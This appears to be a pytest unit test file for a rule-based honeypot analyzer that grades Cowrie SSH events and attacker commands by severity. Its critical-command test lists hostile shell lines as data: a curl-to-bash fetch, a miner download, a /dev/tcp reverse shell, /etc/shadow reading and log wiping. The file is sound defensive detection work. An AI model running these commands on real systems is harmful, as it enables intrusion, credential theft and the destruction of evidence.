"""Deterministic Threat Analyzer Unit Tests

Verifies rule-based classification signatures, severity assignment,
and command analysis without AI/ML.
"""

from honeypot.analyzer import (
    ThreatAnalyzer,
    SEVERITY_LOW,
    SEVERITY_MEDIUM,
    SEVERITY_HIGH,
    SEVERITY_CRITICAL,
    CATEGORY_CONNECTION_ATTEMPT,
    CATEGORY_FAILED_AUTH,
    CATEGORY_SUCCESSFUL_AUTH,
    CATEGORY_COMMAND_EXECUTION,
    CATEGORY_RECONNAISSANCE,
    CATEGORY_MALICIOUS_PAYLOAD,
    CATEGORY_SESSION_LIFECYCLE
)


def test_connection_event_evaluation():
    """Verify that TCP connection initiation events are assigned LOW severity."""
    category, severity, explanation = ThreatAnalyzer.evaluate_event('cowrie.session.connect')
    assert category == CATEGORY_CONNECTION_ATTEMPT
    assert severity == SEVERITY_LOW
    assert "session established" in explanation.lower()


def test_session_lifecycle_event():
    """Verify session closed events are classified as LOW severity."""
    category, severity, explanation = ThreatAnalyzer.evaluate_event('cowrie.session.closed')
    assert category == CATEGORY_SESSION_LIFECYCLE
    assert severity == SEVERITY_LOW


def test_failed_login_evaluation():
    """Verify that single failed logins are categorized as MEDIUM severity."""
    category, severity, explanation = ThreatAnalyzer.evaluate_event(
        'cowrie.login.failed', username='root'
    )
    assert category == CATEGORY_FAILED_AUTH
    assert severity == SEVERITY_MEDIUM
    assert "'root'" in explanation


def test_successful_honeypot_login_evaluation():
    """Verify that successful honeypot logins trigger HIGH severity alert."""
    category, severity, explanation = ThreatAnalyzer.evaluate_event(
        'cowrie.login.success', username='support'
    )
    assert category == CATEGORY_SUCCESSFUL_AUTH
    assert severity == SEVERITY_HIGH
    assert "gained shell access" in explanation.lower()


def test_reconnaissance_command_analysis():
    """Verify that common recon commands (uname, whoami, id) are assigned MEDIUM severity."""
    recon_commands = ['uname -a', 'whoami', 'id', 'cat /etc/passwd', 'ifconfig', 'uptime']
    for cmd in recon_commands:
        cat, sev, exp = ThreatAnalyzer.analyze_command(cmd)
        assert cat == CATEGORY_RECONNAISSANCE, f"Failed for cmd: {cmd}"
        assert sev == SEVERITY_MEDIUM, f"Failed for cmd: {cmd}"


def test_critical_malicious_commands():
    """Verify that dangerous payloads (shadow dumping, reverse shell, miner droppers) are CRITICAL."""
    critical_commands = [
        'cat /etc/shadow',
        'curl -s http://malicious.org/bot.sh | bash',
        'wget http://c2.net/miner.bin -O /tmp/miner',
        'rm -rf /var/log/*',
        'chmod +x /tmp/exploit',
        'history -c',
        'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
    ]
    for cmd in critical_commands:
        cat, sev, exp = ThreatAnalyzer.analyze_command(cmd)
        assert cat == CATEGORY_MALICIOUS_PAYLOAD, f"Failed category for: {cmd}"
        assert sev == SEVERITY_CRITICAL, f"Failed severity for: {cmd}"


def test_arbitrary_unrecognized_command():
    """Verify that unknown shell commands default to HIGH severity command execution."""
    cat, sev, exp = ThreatAnalyzer.analyze_command("echo 'random non-pattern command'")
    assert cat == CATEGORY_COMMAND_EXECUTION
    assert sev == SEVERITY_HIGH
